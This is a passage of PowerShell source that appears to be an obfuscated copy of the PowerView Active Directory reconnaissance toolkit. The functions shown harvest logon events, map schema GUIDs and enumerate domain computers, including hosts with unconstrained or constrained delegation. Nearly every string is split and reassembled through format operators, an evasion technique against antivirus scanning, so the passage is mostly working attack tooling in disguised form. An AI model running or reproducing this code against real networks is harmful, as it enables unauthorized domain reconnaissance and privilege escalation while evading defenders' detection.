                Write-Warning ('[Set'+'-DomainUs'+'e'+'rP'+'ass'+'word'+']'+' '+'Er'+'r'+'or '+'settin'+'g '+'p'+'as'+'s'+'word '+'for'+' '+'us'+'er '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            Write-Warning ('[Set-Do'+'mainUse'+'rP'+'assword'+'] '+'Unab'+'le '+'to'+' '+'fin'+'d '+'us'+'er '+"'$Identity'")
        }
    }
}


function Get-DomainUserEvent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{0}{1}{2}" -f 'Should','Pro','cess','S','P'}, '')]
    [OutputType({"{3}{2}{5}{1}{0}{4}" -f've','nE','V','Power','nt','iew.Logo'})]
    [OutputType({"{10}{9}{3}{5}{4}{8}{1}{2}{6}{7}{0}"-f 'nEvent','xplicitCredenti','alL','i','.','ew','og','o','E','erV','Pow'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{2}{0}"-f 'ostname','dn','sh'}, {"{1}{0}"-f 'ame','HostN'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        
        $XPathFilter = (('di'+'J'+'
'+'<Que'+'ryList>
'+' ').REpLacE('diJ',[strinG][ChaR]34)+' '+' '+' '+'<Que'+'ry '+('Id'+'={0'+'}0{'+'0}'+' ') -F [ChAR]34+('Pat'+'h'+'={0}Security{0}>

'+' ') -f  [ChaR]34+' '+' '+' '+' '+' '+' '+' '+'<!-'+'- '+'L'+'ogon'+' '+'ev'+'ents'+' '+'-->'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<Sel'+'ect '+('Path=Ig'+'p'+'Secur'+'i'+'tyIgp>
'+' ').rePLaCe('Igp',[StRInG][chAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sys'+'t'+'em[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Provi'+'der[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@N'+'ame=z'+'fYMi'+'cros'+'oft-W'+'i'+'nd'+'o'+'ws-Secur'+'ity-Auditingzf'+'Y
 ') -CrEPlAce  'zfY',[cHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'('+'L'+'evel'+'=4 '+'or'+' '+'Le'+'vel=0)'+' '+'an'+'d '+'(Ev'+'entID='+'4624)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'T'+'imeCre'+'a'+'t'+'ed[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@SystemTi'+'me&gt'+';='+'E0'+'S6AB'+'(6'+'ABStart'+'Tim'+'e.ToUniver'+'salTime'+'().'+'ToS'+'tri'+'ng(E0S'+'sE'+'0S'+')'+')E0'+'S ').rEPLAce('6AB',[sTRING][cHAr]36).rEPLAce(([cHAr]69+[cHAr]48+[cHAr]83),[sTRING][cHAr]39)+'a'+'nd '+(('@'+'S'+'ystemTime&'+'lt'+';='+'zFvNVJ(NVJEndTime'+'.T'+'o'+'Un'+'iversal'+'Time'+'('+')'+'.T'+'oSt'+'r'+'i'+'ng(z'+'FvszFv))zFv
'+' ') -crEpLace  'zFv',[chAR]39 -crEpLace  ([chAR]78+[chAR]86+[chAR]74),[chAR]36)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('*[Eve'+'nt'+'Data[Da'+'ta[@Na'+'m'+'e'+'=QaK'+'T'+'arg'+'etUserN'+'a'+'meQaK]'+' ') -CrEPLACE 'QaK',[cHAr]39)+'!'+'= '+('CF'+'2'+'A'+'NONYMOUS ').RepLaCE('CF2',[sTrING][chaR]39)+('LO'+'GON{'+'0}]]'+'
 ')-F[Char]39+' '+' '+' '+' '+' '+' '+' '+'</Select'+'>
'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'!-- '+'Lo'+'gon '+'wi'+'th '+'e'+'xplicit'+' '+'crede'+'n'+'tial'+' '+'eve'+'n'+'ts '+'-'+'->
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'Sel'+'ect '+(('Pa'+'th=i'+'KcSecur'+'ity'+'iKc>
 ') -rEplAcE'iKc',[CHar]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sy'+'stem'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'P'+'r'+'ovider[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Name=W'+'eiMi'+'cr'+'os'+'oft-Windows-Se'+'cur'+'ity-Audit'+'ingWe'+'i
 ').rEPlace('Wei',[STrINg][CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'(L'+'e'+'vel=4 '+'or'+' '+'Lev'+'el='+'0)'+' '+'and'+' '+'(EventID'+'='+'46'+'48'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'TimeCreat'+'e'+'d['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Sy'+'stemTime&gt;'+'={0'+'}{1}({'+'1}StartTi'+'me.ToUnive'+'rs'+'al'+'Time().To'+'String({0'+'}s'+'{'+'0'+'}'+')'+')'+'{0'+'}'+' ')  -f [char]39,[char]36+'an'+'d '+('@Syst'+'em'+'T'+'i'+'me&lt;={1'+'}{0'+'}'+'({0}E'+'ndT'+'ime.'+'T'+'oUniv'+'ersalTime().T'+'oS'+'t'+'ring({1'+'}'+'s'+'{1})){1}'+'
'+' ')  -f  [CHAr]36,[CHAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'</Se'+'lect>'+'

 '+' '+' '+' '+' '+' '+' '+' '+'<Su'+'pp'+'ress '+(('P'+'ath=ADcSecu'+'rityA'+'Dc>'+'
 ') -crEPLaCE'ADc',[ChAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sys'+'tem[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Provider'+'['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@N'+'a'+'me='+'{0}M'+'i'+'crosoft-W'+'i'+'n'+'dows-S'+'ecuri'+'ty-Auditin'+'g{'+'0}
 ') -F  [chAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(Level'+'=4'+' '+'o'+'r '+'L'+'evel='+'0'+') '+'a'+'nd '+'(Eve'+'ntID'+'=4624 '+'or'+' '+'E'+'ve'+'ntID'+'=4625 '+'or'+' '+'Eve'+'ntI'+'D=46'+'34'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'v'+'ent'+'Data[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('(Data['+'@'+'Name={'+'0}LogonTy'+'pe{0}]={0'+'}'+'5{0} ')-f  [CHAR]39+'or'+' '+('Data[@Na'+'me={0}Lo'+'g'+'onT'+'ype{'+'0}]='+'{0}0{0})
 ')-F[ChaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Data'+'['+'@N'+'ame=lHV'+'Targ'+'etUs'+'erNa'+'m'+'el'+'HV]=lHVANONYMOUS'+' ').RePLAcE('lHV',[STRinG][cHAR]39)+('LO'+'GON'+'08'+'E
 ').rEPlAcE(([cHAR]48+[cHAR]56+[cHAR]69),[sTrIng][cHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('D'+'ata'+'['+'@Name={'+'0}TargetUse'+'r'+'SID{'+'0}'+']'+'={0}S'+'-1-'+'5'+'-18{0}
 ')  -F[ChAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'</Sup'+'pr'+'e'+'ss>
 '+' '+' '+' '+(('</Quer'+'y>
'+'</Q'+'u'+'eryList>
vh'+'8')  -REpLACe([ChaR]118+[ChaR]104+[ChaR]56),[ChaR]34))
        $EventArguments = @{
            ("{2}{3}{1}{0}" -f'ath','XP','Fil','ter') = $XPathFilter
            ("{0}{1}"-f'LogNam','e') = ("{1}{0}" -f 'rity','Secu')
            ("{2}{0}{1}" -f'ent','s','MaxEv') = $MaxEvents
        }
        if ($PSBoundParameters[("{1}{3}{0}{2}"-f 'eden','C','tial','r')]) { $EventArguments[("{1}{2}{0}" -f 'edential','C','r')] = $Credential }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            $EventArguments[("{3}{2}{0}{1}" -f'mput','erName','o','C')] = $Computer

            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $Properties = $Event.Properties
                Switch ($Event.Id) {
                    
                    4624 {
                        
                        if(-not $Properties[5].Value.EndsWith('$')) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $Properties[0].Value.ToString()
                                SubjectUserName           = $Properties[1].Value
                                SubjectDomainName         = $Properties[2].Value
                                SubjectLogonId            = $Properties[3].Value
                                TargetUserSid             = $Properties[4].Value.ToString()
                                TargetUserName            = $Properties[5].Value
                                TargetDomainName          = $Properties[6].Value
                                TargetLogonId             = $Properties[7].Value
                                LogonType                 = $Properties[8].Value
                                LogonProcessName          = $Properties[9].Value
                                AuthenticationPackageName = $Properties[10].Value
                                WorkstationName           = $Properties[11].Value
                                LogonGuid                 = $Properties[12].Value
                                TransmittedServices       = $Properties[13].Value
                                LmPackageName             = $Properties[14].Value
                                KeyLength                 = $Properties[15].Value
                                ProcessId                 = $Properties[16].Value
                                ProcessName               = $Properties[17].Value
                                IpAddress                 = $Properties[18].Value
                                IpPort                    = $Properties[19].Value
                                ImpersonationLevel        = $Properties[20].Value
                                RestrictedAdminMode       = $Properties[21].Value
                                TargetOutboundUserName    = $Properties[22].Value
                                TargetOutboundDomainName  = $Properties[23].Value
                                VirtualAccount            = $Properties[24].Value
                                TargetLinkedLogonId       = $Properties[25].Value
                                ElevatedToken             = $Properties[26].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, ("{2}{4}{1}{3}{0}" -f 'nt','ew.LogonE','Po','ve','werVi'))
                            $Output
                        }
                    }

                    
                    4648 {
                        
                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match ((("{2}{1}{3}{0}"-f'e','skhost{0}','ta','.ex'))-f[ChaR]92))) {
                            $Output = New-Object PSObject -Property @{
                                ComputerName              = $Computer
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $Properties[0].Value.ToString()
                                SubjectUserName   = $Properties[1].Value
                                SubjectDomainName = $Properties[2].Value
                                SubjectLogonId    = $Properties[3].Value
                                LogonGuid         = $Properties[4].Value.ToString()
                                TargetUserName    = $Properties[5].Value
                                TargetDomainName  = $Properties[6].Value
                                TargetLogonGuid   = $Properties[7].Value
                                TargetServerName  = $Properties[8].Value
                                TargetInfo        = $Properties[9].Value
                                ProcessId         = $Properties[10].Value
                                ProcessName       = $Properties[11].Value
                                IpAddress         = $Properties[12].Value
                                IpPort            = $Properties[13].Value
                            }
                            $Output.PSObject.TypeNames.Insert(0, ("{3}{2}{4}{7}{6}{9}{8}{1}{5}{0}"-f 'onEvent','tia','erVi','Pow','ew.','lLog','l','Exp','n','icitCrede'))
                            $Output
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}"-f'e','ss','roc','PSShouldP'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}" -f'l','ntrol','DomainCo','er'})]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $GUIDs = @{("{7}{2}{8}{6}{5}{1}{3}{0}{4}" -f'00','-','0000000','00000','00000','-0000','00-0000','0','-00') = 'All'}

    $ForestArguments = @{}
    if ($PSBoundParameters[("{0}{1}{2}"-f 'Cred','ent','ial')]) { $ForestArguments[("{0}{2}{1}" -f 'Creden','ial','t')] = $Credential }

    try {
        $SchemaPath = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw ("{10}{4}{3}{5}{9}{12}{2}{6}{1}{8}{11}{13}{14}{0}{7}" -f ' G',' ','or in r','UID','DomainG','Map','etrieving','et-Forest','for','] ','[Get-','est sch','Err','ema pat','h from')
    }
    if (-not $SchemaPath) {
        throw ("{4}{10}{5}{0}{9}{2}{12}{3}{8}{6}{1}{7}{11}"-f 'or in retriev','m Ge','rest schem',' pa','[Get-DomainGUID','p] Err','fro','t-For','th ','ing fo','Ma','est','a')
    }

    $SearcherArguments = @{
        ("{0}{3}{2}{1}" -f'Se','Base','rch','a') = $SchemaPath
        ("{2}{1}{0}" -f 'ter','il','LDAPF') = (("{3}{1}{4}{2}{0}" -f 'UID=*)','hem','G','(sc','aID'))
    }
    if ($PSBoundParameters[("{0}{1}" -f 'Do','main')]) { $SearcherArguments[("{0}{1}" -f 'Do','main')] = $Domain }
    if ($PSBoundParameters[("{1}{0}" -f'r','Serve')]) { $SearcherArguments[("{0}{2}{1}" -f 'S','rver','e')] = $Server }
    if ($PSBoundParameters[("{1}{2}{4}{3}{0}" -f 'e','Resu','ltPage','z','Si')]) { $SearcherArguments[("{3}{2}{4}{0}{1}" -f'ageS','ize','s','Re','ultP')] = $ResultPageSize }
    if ($PSBoundParameters[("{0}{3}{1}{2}" -f'S','erT','imeLimit','erv')]) { $SearcherArguments[("{2}{1}{4}{0}{3}" -f 'im','erT','Serv','it','imeL')] = $ServerTimeLimit }
    if ($PSBoundParameters[("{3}{0}{1}{2}"-f'den','t','ial','Cre')]) { $SearcherArguments[("{0}{2}{1}"-f 'Cr','al','edenti')] = $Credential }
    $SchemaSearcher = Get-DomainSearcher @SearcherArguments

    if ($SchemaSearcher) {
        try {
            $Results = $SchemaSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[Ge'+'t'+'-Doma'+'inGUIDM'+'ap] '+'Er'+'ror '+'disp'+'o'+'sing '+'o'+'f '+'the'+' '+'Resu'+'lts'+' '+'o'+'bject:'+' '+"$_")
                }
            }
            $SchemaSearcher.dispose()
        }
        catch {
            Write-Verbose ('[Get'+'-D'+'oma'+'in'+'GUIDMa'+'p] '+'Er'+'ror'+' '+'in'+' '+'buil'+'din'+'g '+'GUI'+'D '+'m'+'ap: '+"$_")
        }
    }

    $SearcherArguments[("{2}{0}{1}" -f'earchBas','e','S')] = $SchemaPath.replace(("{1}{0}" -f 'a','Schem'),("{0}{2}{3}{1}" -f'Extend','ts','e','d-Righ'))
    $SearcherArguments[("{1}{0}{2}"-f 'Filt','LDAP','er')] = ("{1}{7}{2}{6}{5}{0}{3}{4}" -f 'Ac','(obj','tCla','cessRigh','t)','control','ss=','ec')
    $RightsSearcher = Get-DomainSearcher @SearcherArguments

    if ($RightsSearcher) {
        try {
            $Results = $RightsSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[G'+'et-Dom'+'ain'+'GUID'+'Ma'+'p] '+'E'+'rror '+'d'+'isp'+'os'+'ing '+'of'+' '+'t'+'he '+'Resu'+'lts '+'objec'+'t: '+"$_")
                }
            }
            $RightsSearcher.dispose()
        }
        catch {
            Write-Verbose ('[Ge'+'t-Domai'+'nGU'+'ID'+'M'+'ap] '+'E'+'rror '+'in'+' '+'buildi'+'ng '+'G'+'UID '+'map:'+' '+"$_")
        }
    }

    $GUIDs
}


function Get-DomainComputer {


    [OutputType({"{1}{2}{4}{3}{0}" -f 'mputer','P','o','.Co','werView'})]
    [OutputType({"{3}{0}{1}{4}{2}"-f'erView.Compu','t','.Raw','Pow','er'})]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{3}{1}{2}{0}"-f'ountName','a','mAcc','S'}, {"{0}{1}"-f'Na','me'}, {"{1}{2}{0}{3}"-f'Ho','D','NS','stName'})]
        [String[]]
        $Identity,

        [Switch]
        $Unconstrained,

        [Switch]
        $TrustedToAuth,

        [Switch]
        $Printers,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{4}{2}" -f'Se','incipal','me','rvicePr','Na'})]
        [String]
        $SPN,

        [ValidateNotNullOrEmpty()]
        [String]
        $OperatingSystem,

        [ValidateNotNullOrEmpty()]
        [String]
        $ServicePack,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [Switch]
        $Ping,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Fil','ter'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'ath','A','DSP'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}"-f 'DomainCo','ller','nt','ro'})]
        [String]
        $Server,

        [ValidateSet({"{0}{1}"-f'B','ase'}, {"{0}{1}{2}" -f'OneLev','e','l'}, {"{0}{2}{1}" -f'Su','ee','btr'})]
        [String]
        $SearchScope = ("{0}{1}"-f'Subt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet({"{0}{1}" -f'Da','cl'}, {"{1}{0}" -f 'roup','G'}, {"{0}{1}" -f 'Non','e'}, {"{0}{1}"-f'Ow','ner'}, {"{1}{0}"-f'cl','Sa'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias({"{2}{1}{0}"-f'e','turnOn','Re'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{1}{0}" -f 'n','Domai')]) { $SearcherArguments[("{0}{1}" -f 'Doma','in')] = $Domain }
        if ($PSBoundParameters[("{1}{0}{2}{3}"-f 'ope','Pr','rtie','s')]) { $SearcherArguments[("{0}{1}{2}"-f'P','r','operties')] = $Properties }
        if ($PSBoundParameters[("{0}{2}{1}" -f'S','hBase','earc')]) { $SearcherArguments[("{2}{1}{0}" -f'se','Ba','Search')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}{2}"-f 'Serv','e','r')]) { $SearcherArguments[("{0}{1}" -f 'Serv','er')] = $Server }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'rchS','cope','Sea')]) { $SearcherArguments[("{1}{0}{2}{3}"-f'rch','Sea','S','cope')] = $SearchScope }
        if ($PSBoundParameters[("{1}{2}{0}" -f 'ageSize','R','esultP')]) { $SearcherArguments[("{3}{4}{2}{1}{0}" -f'e','z','eSi','R','esultPag')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{2}{3}{0}"-f'mit','Ser','ve','rTimeLi')]) { $SearcherArguments[("{0}{1}{3}{2}" -f'Serve','rTi','t','meLimi')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{0}{1}{3}"-f'curity','Mask','Se','s')]) { $SearcherArguments[("{0}{1}{2}{3}"-f 'S','ecur','ityM','asks')] = $SecurityMasks }
        if ($PSBoundParameters[("{1}{0}"-f 'mbstone','To')]) { $SearcherArguments[("{1}{3}{0}{2}" -f 'st','Tom','one','b')] = $Tombstone }
        if ($PSBoundParameters[("{2}{1}{0}" -f'ial','t','Creden')]) { $SearcherArguments[("{1}{0}{2}"-f 'n','Crede','tial')] = $Credential }
        $CompSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($CompSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match ("{1}{0}" -f '-1-','^S')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match ("{1}{0}" -f'=','^CN')) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[("{1}{2}{0}" -f 'in','Dom','a')]) -and (-not $PSBoundParameters[("{2}{0}{3}{1}" -f'chBa','e','Sear','s')])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[Get'+'-Doma'+'in'+'Com'+'p'+'uter] '+'Extr'+'ac'+'ted '+'doma'+'i'+'n '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        $SearcherArguments[("{0}{2}{1}" -f 'D','ain','om')] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning ('[Get-Doma'+'in'+'Compu'+'ter]'+' '+'U'+'nabl'+'e '+'t'+'o '+'retr'+'i'+'eve '+'d'+'omain '+'sear'+'cher'+' '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters[("{1}{0}{2}{3}" -f'ncons','U','tr','ained')]) {
                Write-Verbose ("{5}{4}{2}{10}{3}{7}{1}{15}{14}{11}{8}{6}{0}{12}{16}{13}{9}" -f 'h for','r','m','inComputer] S','-Do','[Get','t','ea','s wi','ned delegation','a','uter',' unco','ai','g for comp','chin','nstr')
                $Filter += (("{8}{0}{4}{5}{7}{3}{1}{2}{6}" -f'untCon',':=524','288','.1.4.803','t','rol:1.2.84',')','0.113556','(userAcco'))
            }
            if ($PSBoundParameters[("{0}{1}{2}" -f 'T','rus','tedToAuth')]) {
                Write-Verbose ("{21}{10}{3}{6}{22}{9}{12}{1}{24}{19}{11}{2}{17}{14}{8}{16}{5}{7}{13}{20}{15}{0}{23}{4}{18}" -f'hent','h','u','a','or other princip',' are tr','inC','usted ','h','ar','et-Dom',' for comp','c','to','t','aut','at','ters ','als','g',' ','[G','omputer] Se','icate f','in')
                $Filter += (("{6}{5}{2}{3}{4}{0}{7}{8}{1}"-f 'eg','=*)','wed','tode','l','sds-allo','(m','atet','o'))
            }
            if ($PSBoundParameters[("{1}{0}{2}" -f'i','Pr','nters')]) {
                Write-Verbose ("{0}{3}{8}{1}{7}{4}{6}{2}{5}" -f '[Get-Dom','er] S','ter','ainComp','pr','s','in','earching for ','ut')
                $Filter += (("{3}{7}{4}{6}{1}{2}{5}{0}"-f'e)','y','=pri','(','ectCate','ntQueu','gor','obj'))
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose ('[Get-'+'Dom'+'a'+'i'+'nComputer] '+'S'+'earch'+'ing '+'fo'+'r '+'comput'+'e'+'rs '+'wit'+'h '+'SPN:'+' '+"$SPN")
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters[("{1}{4}{2}{0}{3}"-f 'ngSys','Ope','i','tem','rat')]) {
                Write-Verbose ('[G'+'et-Do'+'m'+'ainCo'+'mp'+'uter] '+'Se'+'arch'+'ing '+'fo'+'r '+'compute'+'r'+'s '+'wit'+'h '+'ope'+'rat'+'ing '+'s'+'yste'+'m: '+"$OperatingSystem")
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters[("{2}{1}{0}"-f'icePack','v','Ser')]) {
                Write-Verbose ('['+'G'+'et-Domain'+'Compu'+'te'+'r] '+'S'+'ear'+'ching '+'fo'+'r '+'com'+'put'+'ers'+' '+'w'+'ith '+'se'+'rvice '+'p'+'ack:'+' '+"$ServicePack")
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters[("{2}{0}{1}" -f 'iteN','ame','S')]) {
